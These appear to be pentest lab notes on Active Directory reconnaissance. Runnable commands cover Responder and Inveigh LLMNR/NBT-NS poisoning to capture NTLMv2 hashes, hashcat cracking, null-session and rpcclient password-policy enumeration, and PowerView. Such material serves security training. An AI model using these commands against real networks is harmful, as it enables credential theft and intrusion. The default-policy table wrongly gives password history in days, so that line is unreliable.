# Recon

## Ldapsearch

search for valid users, password policy and other attributes such as description

## LLMNR - NBT-NS Poisoning

use tool such as Responder to poison NBT-NS requests and obtain NTLM Hash

LLMNR uses 5355 over UDP NBT-NS uses 137 over UDP

### From Linux

```
responder -h
ls --> SMB-NTLMv2-SSP-172.16.5.200.txt

sudo responder -I ens224 
hashcat -m 5600 SMB-NTLMv2-SSP-172.16.5.200.txt /usr/share/wordlists/rockyou.txt 
```

### From Windows

```
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

C# Inveigh (InveighZero)
.\Inveigh.exe
```

## Enumerate password policy

### Without credentials

```
rpcclient -U "" -N $TARGET
rpcclient $> querydominfo
rpcclient $> getdompwinfo

enum4linux -P $TARGET

enum4linux-ng -P $TARGET -oA ilfreight
```

### From Ldapsearch

```
ldapsearch -h $TARGET -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### From Windows

Powershell :

```
import-module .\PowerView.ps1
Get-DomainPolicy
```

CMD :&#x20;

```
net accounts
```

NULL Session :&#x20;

```
net use \\DC01\ipc$ "" /u:""
```

### Default values when a domain is created

```
Policy	Default Value
Enforce password history	24 days
Maximum password age	42 days
Minimum password age	1 day
Minimum password length	7
Password must meet complexity requirements	Enabled
Store passwords using reversible encryption	Disabled
Account lockout duration	Not set
Account lockout threshold	0
Reset account lockout counter after	Not set
```
